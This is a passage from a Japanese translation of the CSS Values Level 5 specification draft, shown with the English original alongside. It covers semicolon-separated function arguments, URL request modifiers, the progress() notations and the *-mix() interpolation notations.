`§ A.2＠~TR/CSS2/aural.html#aural-intro$
による各種~data型~定義を置換して，拡張する。
この~moduleは、
`~level 4$ を拡張する。
◎
This module extends [CSS-VALUES-4] which replaces and extends the data type definitions in [CSS21] sections 1.4.2.1, 4.3, and A.2.
</p>

		</section>
	</section>
	<section id="textual-values">
<h2 title="Textual Data Types">2. ~textな~data型</h2>

<p>
`~level 4$ の `§ ~textな~data型＠~CSSVAL#textual-values$
を見よ。
◎
See CSS Values 4 § 4 Textual Data Types.
</p>

	</section>
	<section id="value-defs">
<h2 title="Value Definition Syntax">3. 値~定義の構文</h2>

<p>
`~level 4$ の
`§ 値~定義の構文＠~CSSVAL#value-defs$
を見よ。
◎
See CSS Values 4 § 2 Value Definition Syntax.
</p>

		<section id="component-functions">
<h3 title="Functional Notation Definitions">3.1. 関数-記法の定義</h3>

<p>
`~level 4$ の
`§ 関数-記法の定義＠~CSSVAL#component-functions$
を見よ。
◎
See CSS Values 4 § 2.6 Functional Notation Definitions.
</p>

			<section id="component-function-commas">
<h4 title="Commas and Semicolons in Functions">3.1.1. 関数~内の~commaと~semicolon</h4>

<p>
`関数-記法$は、
その内部的な文法を成す各部を分離するために，~commaを利用することが多い。
しかしながら、
一部の関数（ `mix$f など ）は，
値~自体が~commaを包含し得ることを許容する。
◎
Functional notation often uses commas to separate parts of its internal grammar. However, some functions (such as mix()) allow values that, themselves, can contain commas.
</p>

<p>
これらに類する文法を一義的に収容するため、
~level 5 においては，
関数-文法における~commaは~semicolonへ`暗黙的に昇格-可能^emになる。
すなわち，
`関数-記法$の文法における~commaは、
代わりに `semicolon-token$t として表現できる。
ただし、
これは，一律的である
— `関数-記法$における~commaは、［
すべて~semicolonとして書く, すべて~commaとして書く
］どちらかでなければナラナイ。
◎
To accommodate these sorts of grammars unambiguously, commas in functional grammars are implicitly upgradeable to semicolons in Level 5; that is, commas in a functional notation's grammar can instead be represented as &lt;semicolon-token&gt;s. This is all-or-nothing: either every comma in the functional notation must be written as a semicolon, or none of them must be.
</p>

<p>
`関数-記法$を構文解析するときは：
◎
When a functional notation is parsed,＼
</p>
<ol>
	<li>
<p>
初期~時は、
次に従うモノトスル：
◎
initially＼
</p>
		<ul>
			<li>
文法~内の［
~comma（ `,$g ）, ~comma量指定子（ `#$g ）
］は、
`comma-token$t のみに合致する。
◎
commas (,) and comma-multipliers (#) in the grammar match only &lt;comma-token&gt;s in the value,＼
</li>
			<li>
`~commaを包含する生成規則$は、
`comma-token$t を包含することは許容されない
（当の生成規則は［
~commaより前に終端する
］ものと解釈する）。
◎
and any comma-containing productions are not allowed to contain &lt;comma-token&gt;s (the productions must be interpreted as ending before the comma).＼
</li>
		</ul>
	</li>
	<li>
<p>
`関数-記法$を構文解析している間に `semicolon-token$t に遭遇した場合、
次に従う下で，内容を`解釈し直す^emモノトスル：
◎
If a &lt;semicolon-token&gt; is encountered while parsing the functional notation,＼
</p>
		<ul>
			<li>
文法~内の［
~comma, ~comma量指定子
］は、
`semicolon-token$t のみに合致する。
◎
the contents must be re-interpreted, with commas and comma-multipliers in the grammar matching only &lt;semicolon-token&gt;s in the value,＼
</li>
			<li>
`~commaを包含する生成規則$は、
`comma-token$t を包含することが許容される。
◎
and comma-containing productions being allowed to contain &lt;comma-token&gt;s.
</li>
		</ul>
	</li>
</ol>

<p>
`~commaを包含する生成規則@
として定義された生成規則
（ `any-value$t や `whole-value$t など）
内に包含される~commaは、
暗黙的に昇格-可能ではない
— `関数-記法$が~semicolonで解釈し直されているときでも。
これらの生成規則は、
`semicolon-token$t に遭遇した所で終端する。
◎
Commas contained in productions defined as comma-containing productions (such as &lt;any-value&gt; or &lt;whole-value&gt;) are not implicitly upgradeable. Even when a functional notation is being re-interpreted with semicolons, these productions end when a &lt;semicolon-token&gt; is encountered.
</p>

<div class="example">
<p>
例えば `random-item$f 関数の文法：
◎
For example, the grammar of the random-item() function is:
</p>

<pre class="prod">
random-item( `random-caching-options$t, [`declaration-value$t?]# )
</pre>

<p>
において、
`#^g は，
~commaで分離された繰返nを指示するので、
3 個の~keywordから~randomに選ぶことは，
通常の関数と同じく次の様に書かれる：
◎
The # indicates comma-separated repetitions, so randomly choosing between three keywords would be written as normal for functions, like:
</p>

<pre class="lang-css">
list-style: random-item(--x, disc, circle, square);
</pre>

<p>
しかしながら，
~commaを~semicolonへ “昇格する” ことも`許容される^em
— 次の様に：
◎
It is allowed, however, to "upgrade" the commas to semicolons, like:
</p>

<pre class="lang-css">
list-style: random-item(--x; disc; circle; square);
</pre>

<p>
上の両者は、
正確に同じものを意味する。
しかしながら、
~commaと~semicolonを併用した場合は，働かない
— 次は、
代用の後に無効な値を生産し得る：
◎
Both of the above mean the exact same thing. However, mixing commas and semicolons does not work; the following can produce an invalid value after substitution:
</p>

<pre class="lang-css">
list-style: random-item(--x; disc, circle; square);
</pre>

<p>
これは 2 個の値（ `disc, circle^v と `square^v ）から選ぶことを表現するが、
`disc, circle^v は `list-style$p 用の妥当な値ではないので。
◎
because it represents choosing between two values (disc, circle and square) and disc, circle is not a valid list-style value.
</p>

<p>
しかしながら，ときには、
~commaを含む必要がある値を選ぶことが求まれることもある。
例えば， `font-family$p における：
◎
However, sometimes the values you want to choose between need to include commas. For example, in font-family:
</p>

<pre class="lang-css">
font-family: random-item(--x; Times, serif; Arial, sans-serif; Courier, monospace);
</pre>

<p>
は、
3 個の［
~font族たちが成す~list
］
— `Times, serif^v,
`Arial, sans-serif^v,
`Courier, monospace^v —
から 1 つを~randomに選ぶ。
が，どの選択肢も 1 個の~fontしか必要ない場合には、
それらを~commaを利用して分離する`こともできる^em：
◎
This randomly chooses one of three font-family lists: either Times, serif, or Arial, sans-serif, or Courier, monospace. But if only single fonts were needed for each choice, commas could have been used to separate them:
</p>

<pre class="lang-css">
font-family: random-item(--x, serif, sans-serif, monospace);
</pre>
</div>

<p>
`関数-記法$は、
アリなときは，~commaを伴って直列化される（~semicolonではなく）。
◎
Functional notations are serialized with commas (rather than semicolons) whenever possible.
</p>

<p>
次に挙げる汎用な生成規則は、
`~commaを包含する生成規則$である：
◎
The following generic productions are comma-containing productions:
</p>
<ul>
	<li>
`any-value$t
◎
&lt;any-value&gt;
</li>
	<li>
`whole-value$t
◎
&lt;whole-value&gt;
</li>
	<li>
`declaration-value$t
◎
&lt;declaration-value&gt;
</li>
</ul>

			</section>
		</section>
		<section id="urls">
<h3 title="Resource Locators: the &lt;url&gt; type">3.2. 資源の所在指定子： `url$t 型</h3>

<p>
`~level 4$ の `§ 資源の所在指定子＠~CSSVAL#urls$
を見よ。
◎
See CSS Values 4 § 4.5 Resource Locators: the &lt;url&gt; type.
</p>

			<section id="request-url-modifiers">
<h4 title="Request URL Modifiers">3.2.1. 要請~URL改変子</h4>

<p>
`request-url-modifier@t
【 “要請~URL改変子” 】は、
`url-modifier$t を表現する
— それは、
自身に結付けられた`~URLの要請~改変子~用の手続き$を適用することにより，
`url$t への資源`要請$に影響する。
`~level 4$ の `§ ~URL処理~model＠~CSSVAL#url-processing$
を見よ。
◎
&lt;request-url-modifier&gt;s are &lt;url-modifier&gt;s that affect the &lt;url&gt;’s resource request by applying associated URL request modifier steps. See CSS Values 4 § 4.5.4 URL Processing Model.
</p>

<p>
この仕様は、
次に挙げる `request-url-modifier$t を定義する：
◎
This specification defines the following &lt;request-url-modifier&gt;s:
</p>

<div>
<pre class="prod">
`request-url-modifier$t
    = `crossorigin-modifier$t
	| `integrity-modifier$t
	| `referrerpolicy-modifier$t
</pre>
◎
&lt;request-url-modifier&gt; = &lt;crossorigin-modifier&gt; | &lt;integrity-modifier&gt; | &lt;referrerpolicy-modifier&gt;
↓↓ &lt;crossorigin-modifier&gt; = crossorigin(anonymous | use-credentials)
↓↓ &lt;integrity-modifier&gt; = integrity(&lt;string&gt;)
↓↓ &lt;referrerpolicy-modifier&gt; = referrerpolicy(no-referrer | no-referrer-when-downgrade | same-origin | origin | strict-origin | origin-when-cross-origin | strict-origin-when-cross-origin | unsafe-url)
</div>

<dl>
	<dt>
<pre class="prod">
`crossorigin-modifier@t
	= `crossorigin@v(`anonymous@v | `use-credentials@v)
</pre>
	</dt>
	<dd class="algo">
<p>
この改変子~用の`~URLの要請~改変子~用の手続き$は、
所与の
( `要請$ %要請 )
に対し：
◎
The URL request modifier steps for this modifier given request req are:
</p>
		<ol>
			<li>
`要請$の`~mode$rq ~SET `cors^l
◎
Set request's mode to "cors".
</li>
			<li>
~IF［
引数に与えられた値 ~EQ `use-credentials$v
］
⇒
`要請$の`資格証~mode$rq ~SET `include^l
◎
If the given value is use-credentials, set request's credentials mode to "include".
</li>
		</ol>
	</dd>

	<dt>
<pre class="prod">
`integrity-modifier@t
	= `integrity@v(`string$t)
</pre>
	</dt>
	<dd class="algo">
この改変子~用の`~URLの要請~改変子~用の手続き$は、
所与の
( `要請$ %要請 )
に対し
⇒
%要請 の`完全性~metadata$rq ~SET 引数に与えられた `string$t
◎
The URL request modifier steps for this modifier given request req are to set request's integrity metadata to the given &lt;string&gt;.
</dd>

	<dt>
<pre class="prod">
`referrerpolicy-modifier@t
	= `referrerpolicy@v(
		`no-referrer@v
		| `no-referrer-when-downgrade@v
		| `same-origin@v
		| `origin@v
		| `strict-origin@v
		| `origin-when-cross-origin@v
		| `strict-origin-when-cross-origin@v
		| `unsafe-url@v )
</pre>
	</dt>

	<dd class="algo">
この改変子~用の`~URLの要請~改変子~用の手続き$は、
所与の
( `要請$ %要請 )
に対し
⇒
%要請 の`~referrer施策$rq ~SET 引数に与えられた値に合致する `ReferrerPolicy$I 値
◎
The URL request modifier steps for this modifier given request req are to set request's referrer policy to the ReferrerPolicy that matches the given value.
</dd>
</dl>

<div class="algo">
<p>
`~URL値からの要請~改変子を適用する@
ときは、
所与の
( `要請$ %要請, `url$t %~URL )
に対し
⇒
%~URL 内に指定された
~EACH( `request-url-modifier$t %改変子 )
に対し
⇒
%改変子 用の`~URLの要請~改変子~用の手続き$( %要請 )
◎
To apply request modifiers from URL value given a request req and a &lt;url&gt; url, call the request modifier steps for url’s &lt;request-url-modifier&gt;s in sequence given req.
</p>
</div>

			</section>
		</section>
	</section>
	<section id="progress">
<h2 title="Interpolation Progress Functional Notations">4. 補間~進捗-関数-記法</h2>

<p class="issue">
この節は、
探求段階な草案であり，まだ~CSS~WGにより認可されてない。
`6245$issue
◎
This section is an exploratory draft, and not yet approved by the CSSWG. [Issue #6245]
</p>

<p>
`関数-記法$［
`progress$f ／ `media-progress$f ／ `container-progress$f
］は、［
`~math関数$／`媒体~特能$／`容器~特能$
］から進捗~率を取り出すことを許容する。
いずれも、
所与の［
`進捗~値@,
`進捗~始端~値@,
`進捗~終端~値@
］に対し［
`進捗~始端~値$からの，
`進捗~終端~値$までの距離に対する`進捗~値$までの距離の~~割合
］を表現し，次の共通な構文-~patternに従う：
◎
The progress(), media-progress(), and container-progress() functional notations represent the proportional distance of a given value (the progress value) from one value (the progress start value) to another value (the progress end value). They allow drawing a progress ratio from math functions, media features, and container features, respectively, following a common syntactic pattern:
</p>

<pre class="prod">
%進捗~関数()
	= %進捗~関数( %進捗-値 from %始端~値 to %終端~値 )
</pre>

<p>
結果の比率は、
`~math関数$や`混合-記法$など，
他の計算式の中への入力を成し得る。
◎
The resulting ratio can then be input into other calculations, such as a math function or a mix notation.
</p>

		<section id="progress-func">
<h3 title="Calculated Progress Values: the progress() notation">4.1. 計算された進捗-値： `progress^f 記法</h3>

<p>
`progress@f
`関数-記法$は：
◎
The progress() functional notation＼
</p>
<ul>
	<li>
次を表現している `number$t 値を返す
⇒
入力を成す 2 つの`計算式$ %計算式たち
（`進捗~始端~値$, `進捗~終端~値$）
の合間における`計算式$（`進捗~値$）の位置。
◎
returns a &lt;number&gt; value representing the position of one calculation (the progress value) between two other calculations (the progress start value and progress end value).＼
</li>
	<li>
%計算式たち は、
それを成す各~計算式は［
`number$t, `dimension$t, `percentage$t
］いずれにも解決され得るが，
`一貫した型を有して$いなければナラナイ
— さもなければ、
当の関数は無効になる。
◎
The argument calculations can resolve to any &lt;number&gt;, &lt;dimension&gt;, or &lt;percentage&gt;, but must have a consistent type or else the function is invalid.＼
</li>
	<li>
その`型$は、
次の結果になる
⇒
`型を入力と一貫させる$( `型を作成する$( `number^l ) , %計算式たち の`一貫した型$ )
◎
The result will be a &lt;number&gt;, made consistent with the consistent type of the arguments.
</li>
</ul>

<p>
`progress$f の構文は、
次で定義される：
◎
The syntax of progress() is defined as follows:
</p>

<pre class="prod">
`progress()@t
	= progress(`calc-sum$t from `calc-sum$t to `calc-sum$t)
</pre>

<p>
各 `calc-sum$t 値は、
順に［
`進捗~値$,
`進捗~始端~値$,
`進捗~終端~値$
］を表現する。
◎
where the first, second, and third &lt;calc-sum&gt; values represent the progress value, progress start value, and progress end value, respectively.
</p>

<p>
妥当な `progress$f 記法は、
次の結果を `number$t として返す
⇒
( %進捗-値 ~MINUS %始端~値 ) ~DIV ( %終端~値 ~MINUS %始端~値 )
◎
The value returned by a valid progress() notation is (progress value - start value) / (end value - start value), as a &lt;number&gt;.
</p>

<p class="issue">
`percent-progress^f 記法は必要か？
あるいは、
必要yでないほど十分な箇所で【百分率から】自動-変換されているのか？
◎
Do we need a percent-progress() notation, or do enough places auto-convert that it’s not necessary?
</p>

<p class="note">注記：
`progress$f 関数は、
本質的には， `calc$f 記法が成す特定0の~pattern用の構文-糖衣である。
◎
Note: The progress() function is essentially syntactic sugar for a particular pattern of calc() notations.
</p>

		</section>
		<section id="media-progress-func">
<h3 title="Media Query Progress Values: the media-progress() notation">4.2. 媒体~query進捗-値： `media-progress^f 記法</h3>

<p>
`media-progress@f
`関数-記法$は、
`progress$f 記法と類似に，［
指定された`媒体~query$用の 2 個の明示的な値
（`進捗~始端~値$, `進捗~終端~値$）
の合間における`進捗~値$
］として［
当の`媒体~query$ `MEDIAQUERIES-4$r の現在の値【`実~値$】を表現している `number$t 値
］を返す。
◎
Similar to the progress() notation, the media-progress() functional notation returns a &lt;number&gt; value representing current value of the specified media query [MEDIAQUERIES-4] as a progress value between two explicit values of the media query (as the progress start value and progress end value).
</p>

<p>
`media-progress$f の構文は、
次で定義される：
◎
The syntax of media-progress() is defined as follows:
</p>

<pre class="prod">
`media-progress()@t
	= media-progress(`media-feature$t from `calc-sum$t to `calc-sum$t)
</pre>

<p>
妥当な `media-progress$f 記法は、
次の結果を `number$t として返す
⇒
%進捗-値 ~DIV ( %終端~値 ~MINUS %始端~値 )
◎
The value returned by a valid media-progress() notation is progress value / (end value - start value, as a &lt;number&gt;.
</p>

<p>
`媒体~query$には妥当な “範囲” 型の~query，［
`進捗~始端~値$, `進捗~終端~値$
］には当の`媒体~query$用の妥当な値を指定しなければナラナイ
— さもなければ、
当の関数は無効になる。
◎
The specified media query must be a valid “range” type query, and its specified progress start value and progress end value must be valid values for the specified media query, or else the function is invalid.
</p>

<p>
入力を成す 2 つの`計算式$ %計算式たち は、
`一貫した型を有して$いなければナラナイ
— さもなければ、
当の関数は無効になる。
当の関数の`型$は、
次の結果になる
⇒
`型を入力と一貫させる$( `型を作成する$( `number^l ) , %計算式たち の`一貫した型$ )
◎
The two input calculations but must have a consistent type or else the function is invalid. The result will be a &lt;number&gt;, made consistent with the consistent type of the arguments.
</p>

		</section>
		<section id="container-progress-func">
<h3 title="Container Query Progress Values: the container-progress() notation">4.3. 容器~query進捗-値： `container-progress^f 記法</h3>

<p>
`container-progress@f
`関数-記法$は、
`媒体~特能$に代えて`容器~特能$ `CSS-CONTAIN-3$r を受容することを除いて，
`media-progress$f 関数-記法と一致する。
◎
The container-progress() functional notation is identical to the media-progress() functional notation, except that it accepts container features [CSS-CONTAIN-3] in place of media features.
</p>

<p>
`container-progress$f の構文は、
次で定義される：
◎
The syntax of container-progress() is defined as follows:
</p>

<pre class="prod">
`container-progress()@t
	= container-progress(`size-feature$t [ of `container-name$t ]? from `calc-sum$t to `calc-sum$t)
</pre>

<p>
ここで，省略可能な `container-name$t 成分は、
どの容器を~~基準に解決するか選定するときに考慮される有名~容器を指定する。
◎
where the optional &lt;container-name&gt; component specifies the named containers to consider when selecting a container to resolve against.
</p>

<p>
入力を成す 2 つの`計算式$ %計算式たち は、
`一貫した型を有して$いなければナラナイ
— さもなければ、
当の関数は無効になる。
当の関数の`型$は、
次の結果になる
⇒
`型を入力と一貫させる$( `型を作成する$( `number^l ) , %計算式たち の`一貫した型$ )
◎
The two input calculations but must have a consistent type or else the function is invalid. The result will be a &lt;number&gt;, made consistent with the consistent type of the arguments.
</p>

<p>
適切な容器が見出されなかった場合、
`container-progress$f の `size-feature$t ~queryは，
`小さい表示域~size$を~~基準に解決される。
◎
If no appropriate containers are found, container-progress() resolves its &lt;size-feature&gt; query against the small viewport size.
</p>

		</section>
	</section>
	<section id="mixing">
<h2 title="Mixing and Interpolation Notations: the *-mix() family">5. 混合-法と補間~記法： `*-mix^f 族</h2>

<p class="issue">
この節は、
探求段階な草案であり，まだ~CSS~WGにより認可されてない。
`6245$issue
◎
This section is an exploratory draft, and not yet approved by the CSSWG. [Issue #6245]
</p>

<p>
~CSSにおける いくつかの
`混合-記法@
は、［
`混合-始端~値@
,
`混合-終端~値@
の合間における ある地点までの進捗
］を与える
`混合-進捗~値@
への補間を表現することを許容する。
これらの`関数-記法$は、
次の構文-~patternに従う：
◎
Several mix notations in CSS allow representing the interpolation of two values, the mix start value and the mix end value, at a given point in progress between them (the mix progress value). These functional notations follow the syntactic pattern:
</p>

<pre class="prod">
%混合-関数()
	= %混合-関数( `progress$t, `start-value^t, `end-value^t )
</pre>
【！mix-function( &lt;progress&gt;, [=mix start value|start-value=], [=mix end value|end-value=] )】

<p>
~CSSにおける`混合-記法$には、
次に挙げるものがある：
◎
The mix notations in CSS include:
</p>
<ul>
	<li>
`calc-mix$f
⇒
`calc$f 式~内で表現-可能な次元
— `length$t, `percentage$t, `time$t など —
の補間-用
◎
calc-mix(), for interpolating &lt;length&gt;, &lt;percentage&gt;, &lt;time&gt;, and other dimensions representable in calc() expressions
</li>
	<li>
`color-mix$f
⇒
`color$t 値の補間-用
◎
color-mix(), for interpolating two &lt;color&gt; values
</li>
	<li>
`cross-fade$f
⇒
`image$t 値の補間-用
◎
cross-fade(), for interpolating &lt;image&gt; values
</li>
	<li>
`palette-mix$f
⇒
`font-palette$p 値の補間-用
◎
palette-mix(), for interpolating two font-palette values
</li>
	<li>
汎用な `mix$f
⇒
どの~propに対しても，その値の補間を表現できる
— ただし、
~propの値を成す個々の成分ではなく，値~全体を成す場合に限る。
◎
and finally the generic mix() notation, which can represent the interpolation of any property’s values (but only the property’s entire value, not individual components).
</li>
</ul>

<p class="note">注記：
`cross-fade$f 記法にも，［
3 個~以上の値を混合することを許容する代替な構文
］があるが、
それらは，より複階的な `progress$t を成す式を許容しない。
◎
Note: The cross-fade() notation also has an alternative syntax that allows for mixing more than two values, but does not allow for the more complex expressions of &lt;progress&gt;.
</p>

<p class="issue">
`mix$f 記法には、
~keyframeたちが成す集合をとる変種もある。
それは、［
ある `keyframes$at 規則を参照rして，そこから対応している~prop宣言を取り出す
］ことにより，これを行う。
他の混合-記法も~keyframeを許容するようになれば良さそうだが、
~keyframeたちが成す集合を（~propの全部的な値ではなく）`成分~値$用にどう表現するか？
◎
The mix() notation also has a variant that takes a set of keyframes. It does this by referring to an @keyframes rule, and pulling the corresponding property declaration out of that. It would be nice to allow the other mix notations to take keyframe also, but how would we represent a set of keyframes for a component value (rather than a full property value)?
</p>

		<section id="progress-type">
<h3 title="Representing Interpolation Progress: the &lt;progress&gt; type">5.1. 補間~進捗の表現-法： `progress^t 型</h3>

<p>
`progress@t
型の値は、
`混合-記法$を成す`混合-進捗~値$を表現する。
それは、最終的に百分率に解決されるが，
媒体~queryや~animation時列線などの~sourceから取り出した百分率~値を
— 補間~用に利用する前に —
`~easing関数$を通して変換できる。
◎
The &lt;progress&gt; value type represents the mix progress value in a mix notation, and ultimately resolves to a percentage. It can, however, draw that percentage value from sources such as media queries and animation timelines, and can also convert it through an easing function before using it for interpolation.
</p>

<p>
その構文は、
次で定義される：
◎
Its syntax is defined as follows:
</p>

<pre class="prod">
`progress$t
	= [ `percentage$t | `number$t | `animation-timeline$tp ]? &amp;&amp; by `easing-function$t
</pre>

<p>
ここで：
◎
where:
</p>

<dl class="valdef">
	<dt id="valdef-progress-percentage-token">`percentage-token$t</dt>
	<dd>
等価な `number$t に算出される
— `0%^v は `0^v になり, `100%^v は `1^v になる, 等々。
◎
Computes to the equivalent &lt;number&gt;: 0% becomes 0, 100% becomes 1, etc. 
</dd>
	<dd class="note">注記：
これは、
`15%^v の様な~literalな百分率しか許容しない。
`calc(100% / 7)^v の様な計算式は、
働かないことになる
— それは、
代わりに，［
百分率を別の型（ `width$p における `length$t など）を~~基準に解決するための通常の規則
］を利用するよう試みるので。
代わりに `calc(1 / 7)^v の様な式を利用すること。
◎
Note: This only allows literal percentages, like 15%; calculations like calc(100% / 7) will not work, as they will instead attempt to use the normal rules for resolving a percentage against another type (such as &lt;length&gt;, in width). Use expressions like calc(1 / 7) instead.
</dd>

	<dt id="valdef-progress-number">`number$t</dt>
	<dd>
`混合-進捗~値$を表現する。
◎
Represents the mix progress value. 
</dd>
	<dd class="note">注記：
これは、［
`progress$f／
`media-progress$f／
`container-progress$f
］記法の利用を許容することに注意。
◎
Note: This allows the use of the progress(), media-progress(), and container-progress() notations.
</dd>

	<dt id="valdef-progress-animation-timeline">`animation-timeline$tp</dt>
	<dd>
指定された`~animation時列線＠~WANIM#timelines$の進捗†として`混合-進捗~値$を表現する。
ただし，値［
`none$v, `auto$v
］は妥当でない。
`CSS-ANIMATIONS-2$r
`WEB-ANIMATIONS-2$r
◎
Represents the mix progress value as the progress of the specified animation timeline. The values none and auto, however, are invalid. [CSS-ANIMATIONS-2] [WEB-ANIMATIONS-2]
</dd>
	<dd class="trans-note">【†
`開始-時刻$から`終止-時刻$までにおける`現-時刻$の進捗~率を表すように思われるが、
はっきりしない。
】</dd>

	<dt id="valdef-progress-easing-function">`easing-function$t</dt>
	<dd>
指定された`~easing関数$ `CSS-EASING-1$r を利用して，
指定された入力`混合-進捗~値$を出力`混合-進捗~値$へ変換する。
◎
Converts the specified input mix progress value into an output mix progress value using the specified easing function. [CSS-EASING-1]
</dd>
</dl>

<p class="note">注記：
［
`0^v 以上 `1^v 以下
］でない進捗~値も妥当であり、［
始端~値, 終端~値
］により定義される範囲を超える補間を表現することを許容する。
◎
Note: Progress values below 0 and above 1 are valid; they allow representing interpolation beyond the range defined by the start and end values.
</p>

<p class="note">注記：
`progress$t 自体は，
`percentage$t であり得るが、［
`progress$f の様な `number$t へ`解決され^emる関数を等価な `number$t へ直に対応付ける
］ときは， `percentage$t を当の文脈~用の通常の規則を利用して解決する。
例えば、
`width$p においては，ある長さを~~基準に解決されることになる。
◎
Note: While &lt;progress&gt; itself can be a &lt;percentage&gt;, mapping directly to the equivalent &lt;number&gt;, a function that resolves to a &lt;number&gt;, like progress(), resolves &lt;percentage&gt;s using the normal rules for the context; for example, in width, they would be resolved against a length.
</p>

<p>
`progress$t 値の`算出d値$は、［
`percentage$t ／ `number$t
］を伴って指定された場合は `number^t の算出d値になり，
`animation-timeline$tp を伴って指定された場合には
`animation-timeline$tp の算出d値になる
— いずれも、
`easing-function$t が与えられた場合は，それを通して変換される。
◎
The computed value of a &lt;progress&gt; value specified with &lt;percentage&gt; or &lt;number&gt; is the computed &lt;number&gt; converted through the &lt;easing-function&gt; (if any). The computed value of a &lt;progress&gt; value specified with &lt;'animation-timeline'&gt; is the computed &lt;'animation-timeline'&gt; and &lt;easing-function&gt; (if any).
</p>

		</section>
		<section id="calc-mix">
<h3 title="Interpolated Numeric and Dimensional Values: the calc-mix() notation">5.2. 補間された数量-値： `calc-mix^f 記法</h3>

<p>
`calc-mix@f
`混合-記法$
は、
補間された数量-値（次元を伴い得る数）を表現する。
【！Like `calc$f 】
それは、
次の構文-形を伴う`~math関数$である：
◎
The calc-mix() mix notation represents an interpolated numeric or dimensional value. Like calc(), it is a math function, with the following syntactic form:
</p>

<pre class="prod">
`calc-mix()@t
	= calc-mix( `progress$t, `calc-sum$t, `calc-sum$t )
</pre>

<p>
入力を成す 2 つの`計算式$ %計算式たち は、
それを成す各~計算式は［
`number$t, `dimension$t, `percentage$t
］いずれにも解決され得るが，
`一貫した型を有して$いなければナラナイ
— さもなければ、
当の関数は無効になる。
当の関数の`型$は、
次の結果になる
⇒
`型を入力と一貫させる$( %計算式たち の`一貫した型$, 入力を成す `progress$t 値の`型$ )
◎
The &lt;calc-sum&gt; arguments can resolve to any &lt;number&gt;, &lt;dimension&gt;, or &lt;percentage&gt;, but must have a consistent type or else the function is invalid. The result’s type will be the consistent type, made consistent with the type of the &lt;progress&gt; value.
</p>

<p>
妥当な `calc-mix$f の：
◎
↓</p>
<ul>
	<li>
`使用~値$は、
所与の 2 個の `calc-sum$t 値を所与の `progress$t による進捗へ補間した結果になる。
◎
The used value of a valid calc-mix() is the result of interpolating these two values to the progress given by &lt;progress&gt;.＼
</li>
	<li>
<p>
`算出d値$は：
</p>
		<ul>
			<li>
所与の `progress^t が ある `number$t 値 %進捗 に算出できる場合、
所与の 2 個の `calc-sum$t の算出d値 ( %A, %B ) を %進捗 へ補間した結果になる
（言い換えれば、
%A ~PLUS ( %B ~MINUS %A ) ~MUL %進捗
になる）。
</li>
			<li>
他の場合、
そのまま `calc-mix^f 記法になるが，
その各~引数は各自の型に則って算出される。
</li>
		</ul>
◎
If the &lt;progress&gt; value can be computed to a &lt;number&gt;, then the computed value is likewise the result of interpolating the two computed values to that &lt;progress&gt; value (in other words, A * (1-progress) + B * progress) it is otherwise the calc-mix() notation itself with its arguments each computed according to their type.
</li>
</ul>

		</section>
		<section id="color-mix">
<h3 title="Interpolated Color Values: the color-mix() notation">5.3. 補間された色~値： `color-mix^f 記法</h3>

<p>
この仕様は、
`color-mix$f `関数-記法$を［
次の構文【を成す 1 個目の `color-mix^f 】を受容する`混合-記法$
］で拡張する：
◎
This specification extends the color-mix() functional notation as a mix notation accepting the following syntaxes:
</p>

<pre class="prod">
`color-mix$f
	= color-mix( `progress$t &amp;&amp; `color-interpolation-method$t?, `color$t, `color$t )
	| color-mix( `color-interpolation-method$t, [`color$t &amp;&amp; `percentage [0,100]$t?]#{2} )
</pre>

<p>
1 個目の `color-mix^f 記法の使用~値は、［
所与の `progress$t 値を `percentage$t で表す値 %進捗
］を［
2 個目の `color-mix^f 内の 2 個目の `color$t 引数に伴われる `percentage$t
］にアテガうことと等価になる。
<span class="note">
すなわち、
<code class="value">color-mix( %進捗, %色, %もう一つの色 )</code>
は，
<code class="value">color-mix(…†, %色, %もう一つの色 %進捗 )</code>
と等価になる。
</span>
2 個目の `color-mix^f 用の規範的な定義は、
`CSS-COLOR-5$r `§ 色の混合-法＠~CSSCOLOR5#color-mix$
を見よ。
◎
The used value of the first mix notation variant is equivalent to assigning the &lt;progress&gt; value, as a &lt;percentage&gt;, to the &lt;percentage&gt; of the second &lt;color&gt; argument in the second variant. That is, color-mix(progress, color1, color2) is equivalent to color-mix(color1, color2 progress). See CSS Color 5 § 3 Mixing Colors: the color-mix() Function for the normative definition of the second variant.
</p>

<p class="trans-note">【†
`color-interpolation-method$t を省略した場合の挙動が不明
（本当は省略可能でない？）。
】</p>

<p class="issue">
`progress$t は［
0% 以上 100% 以下
］の外側にある百分率を返すことを許容するが、
【 2 個目の】 `color-mix$f は そのような値を許容しないので，
それをどう処理するか定義する必要がある。
◎
&lt;progress&gt; allows returning percentages outside 0-100%, but color-mix() doesn’t allows such values, so need to define how that gets processed.
</p>

		</section>
		<section id="cross-fade">
<h3 title="Interpolated Image Values: the cross-fade() notation">5.4. 補間された 画像~値： `cross-fade^f 記法</h3>

<p>
この仕様は
`cross-fade$f `関数-記法$を［
次の構文【を成す 1 個目の `cross-fade^f 】を受容する`混合-記法$
］で拡張する：
◎
This specification extends the cross-fade() functional notation as a mix notation accepting the following syntaxes:
</p>

<pre class="prod">
`cross-fade$f
	= cross-fade( `progress$t, [ `image$t | `color$t ], [ `image$t | `color$t ] )
	| cross-fade( `cf-image$t# )
</pre>

<p>
1 個目の `cross-fade^f の`使用~値$は、［
所与の `progress$t 値を `percentage$t で表す値 %進捗
］を［
2 個目の `cross-fade^f 内の 2 個目の `cf-image$t 【！`color^t】引数を成す `percentage$t
］にアテガうことと等価になる。
<span class="note">
すなわち、
<code class="value">cross-fade( %進捗, %画像, %もう一つの画像 )</code>
は，
<code class="value">cross-fade( %画像, %もう一つの画像 %進捗 )</code>
と等価になる。
</span>
2 個目の `cross-fade^f 用の規範的な定義は、
`CSS-IMAGES-4$r `§ 画像の組合n＠~CSSIMAGE4#cross-fade-function$
を見よ。
◎
The used value of the first mix notation variant is equivalent to assigning the &lt;progress&gt; value as the &lt;percentage&gt; of the second &lt;color&gt; argument in the second variant. That is, cross-fade(progress, image1, image2) is equivalent to cross-fade(image1, image2 progress). See CSS Images 4 § 2.6 Combining images: the cross-fade() notation for the normative definition of the second variant.
</p>

		</section>
		<section id="transform-mix">
<h3 title="Interpolated Transform Values: the transform-mix() notation">5.5.  補間された変形~値： `transform-mix^f 記法</h3>

<p>
`transform-mix@f
`混合-記法$は、
`補間-＠~TRANSFORM#interpolation-of-transforms$された `transform-list$t を表現する。
それは、
次の構文-形を伴う：
◎
The transform-mix() mix notation represents an interpolated &lt;transform-list&gt;, with the following syntactic form:
</p>

<pre class="prod">
`transform-mix()@t
	= transform-mix( `progress$t, `transform-list$t, `transform-list$t )
</pre>

<p>
妥当な `transform-mix$f の：
◎
↓</p>
<ul>
	<li>
`使用~値$は、
